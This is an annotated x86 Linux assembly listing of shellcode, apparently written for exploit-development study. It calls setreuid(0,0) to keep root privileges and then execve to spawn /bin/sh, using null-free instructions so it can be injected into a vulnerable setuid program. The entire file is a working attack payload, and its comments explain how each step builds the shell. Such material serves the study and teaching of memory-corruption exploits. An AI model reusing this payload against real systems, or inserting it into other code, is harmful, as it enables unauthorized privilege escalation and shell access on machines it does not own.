section .text		; start the code section of the asm
global _start		; declare a global label

_start:				; keeps the linker from complaining or guessing
;setreuid (0,0)
xor eax, eax		; clear the eax registry, prepare the next line
mov al, 0x46		; set the syscall value to decimal 70 or hex 46, one byte
xor ebx, ebx		; clear the ebx register, set to 0
xor ecx, ecx		; clear the ecx register, set to 0
int 0x80			; call kernel to execute the syscall


; spawn shellcode with execve
xor eax, eax		; clears the eax register, sets to 0
push eax			; push a null value on the stack, value of eax
push 0x68732f2f		; push '//sh' onto the stack, padded with leading '/'
push 0x6e69622f		; push /bin onto the stack, notice strings in reverse
mov ebx, esp		; since esp now points to "/bin/sh", write to ebx
push eax			; eax is still NULL, let's terminate char ** argv on stack
push ebx			; still need a pointer to the address of '/bin/sh', use ebx
mov ecx, esp		; now esp holds the address of argv, move it to ecx
xor edx, edx		; set edx to zero (NULL), not needed
mov al, 0xb			; set the syscall # to the decimal 11 or hex b, one byte
int 0x80			; call the kernel to execute the syscall
